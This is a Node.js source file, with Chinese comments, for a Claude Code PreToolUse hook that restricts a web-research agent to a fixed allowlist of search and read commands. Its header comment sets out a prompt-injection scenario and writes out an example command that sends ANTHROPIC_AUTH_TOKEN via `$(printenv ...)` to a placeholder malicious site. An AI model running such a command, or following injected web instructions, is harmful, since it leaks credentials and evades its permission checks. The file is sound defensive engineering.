#!/usr/bin/env node
// 联网研究员的工具守卫（v0.11.1，§3.4）：作为 claude -p 的 PreToolUse 钩子，
// **每一次** Bash / Read / Skill 调用（含子代理发起的）执行前都先过这里。
//
// 为什么需要它（2026-09-27 实测）：Claude Code 的放行规则按**前缀**匹配。`$VAR` 会被拒，
// 但 `$(...)` 与反引号的命令替换**会放行并执行**——`node research-cli.js search "$(echo x) y"`
// 里的 echo 真的跑了。研究员要读外部网页，网页可能诱导它执行
// `read "https://恶意站点/$(printenv ANTHROPIC_AUTH_TOKEN)"`，令牌就带出去了。
// 所以放行权从前缀规则收回到这里：**白名单写死在代码里、按整条命令全匹配**，
// 引号内只允许安全字符（不含 $ ` \ " 与换行），命令替换、变量、管道、重定向、串联一律拒绝。
//
// 失败即拒绝：研究员的 --allowedTools 里不再有任何 Bash 规则，所以本钩子不明确批准的
// 调用会被 dontAsk 模式自动拒绝；本钩子自己崩了（非 2 退出码）也落到同一个「拒绝」上。
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

// 双引号内，shell 只解释 $ ` \ 与 " 本身——其余（& ; | < > 括号）都是普通字符。
const Q = '[^"$`\\\\\\n\\r]*';                         // 双引号内的安全字符
const URLQ = 'https?://[^\\s"$`\\\\]+';                  // 双引号内的 URL：允许 ?a=1&b=2 这类查询串
const URL = 'https?://[^\\s"\'$`\\\\<>|;&(){}]+';      // 不带引号的 URL：任何 shell 元字符都不行
const esc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

/** 允许的命令形态（整条全匹配）。cli 是 research-cli.js 的绝对路径。 */
export function allowedCommands(cli) {
  const c = esc(cli);
  return [
    // 联网脚本（首选：带重试与并发上限）
    { name: 'research-cli search', re: new RegExp(`^node ${c} search "${Q}"( \\d{1,2})?$`) },
    { name: 'research-cli read', re: new RegExp(`^node ${c} read "${URLQ}"$`) },
    // agent-reach 的体检（skill 常驻规则 1：动手前先体检）
    { name: 'agent-reach doctor', re: /^agent-reach doctor( --json)?$/ },
    // agent-reach 路由表里的原生写法：Exa 搜索与 Jina 读网页。放行是为了不让照 skill 写命令的研究员白白碰壁；
    // 提示词仍要求优先用上面的脚本（原生写法没有重试，并发时 Exa 会间歇失败）
    { name: 'exa search', re: new RegExp(`^mcporter call exa\\.web_search_exa query="${Q}"( numResults=\\d{1,2})?$`) },
    { name: 'jina read', re: new RegExp(`^curl -s ("https://r\\.jina\\.ai/${URLQ}"|https://r\\.jina\\.ai/${URL})$`) },
    // 雪球（agent-reach finance.md）的只读命令。本机未装 opencli 时会报「命令不存在」，无害；
    // login 与任何写操作都不在列（skill 本身也要求不要自动登录）
    { name: 'xueqiu', re: new RegExp(`^opencli xueqiu (search "${Q}"|stock [A-Za-z0-9.]{1,12}|hot|hot-stock|whoami)( -f yaml)?$`) },
  ];
}

const inside = (p, dir) => {
  if (!p || !dir) return false;
  const norm = (x) => {
    const abs = path.resolve(x);
    try { return fs.realpathSync(abs); } catch { return abs; }
  };
  const a = norm(p);
  const d = norm(dir);
  return a === d || a.startsWith(d + path.sep);
};

/**
 * 判定一次工具调用（纯函数，可测）。返回 { decision: 'allow' | 'deny', reason }。
 * e 是钩子的输入（{ tool_name, tool_input }）。
 */
export function checkToolCall(e, { cli, skillDir } = {}) {
  const name = e?.tool_name;
  const input = e?.tool_input || {};
  if (name === 'Bash') {
    const cmd = String(input.command ?? '').trim();
    if (!cmd) return { decision: 'deny', reason: '空命令' };
    const hit = allowedCommands(cli).find((x) => x.re.test(cmd));
    if (hit) return { decision: 'allow', reason: `研究员白名单：${hit.name}` };
    return {
      decision: 'deny',
      reason: '这条命令不在研究员的白名单里。只能用这几种写法（照原样、一次一条，引号内不能出现 $ ` \\ 与换行，'
        + '不能用 ; && | 重定向或命令替换）：'
        + `node ${cli} search "<关键词>" 5 ｜ node ${cli} read "<完整URL>" ｜ agent-reach doctor --json ｜ `
        + 'opencli xueqiu search "<关键词>" -f yaml / stock <代码> -f yaml / hot -f yaml',
    };
  }
  if (name === 'Read') {
    const p = String(input.file_path ?? '');
    if (skillDir && inside(p, skillDir)) return { decision: 'allow', reason: '读 agent-reach 的参考文档' };
    return { decision: 'deny', reason: `研究员只能读 agent-reach 的参考文档（${skillDir || '未配置'} 之内）` };
  }
  if (name === 'Skill') {
    const s = String(input.skill ?? input.name ?? '').trim();
    if (s === 'agent-reach') return { decision: 'allow', reason: '激活 agent-reach' };
    return { decision: 'deny', reason: `研究员只能激活 agent-reach，不能激活 ${s || '其他 skill'}` };
  }
  // 子代理（Task / Agent）不在钩子的 matcher 里；其余工具本就不在 --tools 里，这里兜底拒绝
  if (name === 'Task' || name === 'Agent') return { decision: 'allow', reason: '子代理' };
  return { decision: 'deny', reason: `研究员不能使用 ${name || '未知工具'}` };
}

/** 钩子协议的输出（PreToolUse：permissionDecision 为 allow 即放行，deny 则把理由回给模型）。 */
export const hookOutput = (r) => JSON.stringify({
  hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: r.decision, permissionDecisionReason: r.reason },
});

function main() {
  let s = '';
  process.stdin.on('data', (d) => { s += d; });
  process.stdin.on('end', () => {
    let r;
    try {
      r = checkToolCall(JSON.parse(s), { cli: process.env.MSM_RESEARCH_CLI, skillDir: process.env.MSM_RESEARCH_SKILL_DIR });
    } catch (e) {
      r = { decision: 'deny', reason: `守卫无法解析这次调用，按拒绝处理：${e.message}` };
    }
    process.stdout.write(hookOutput(r));
  });
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) main();
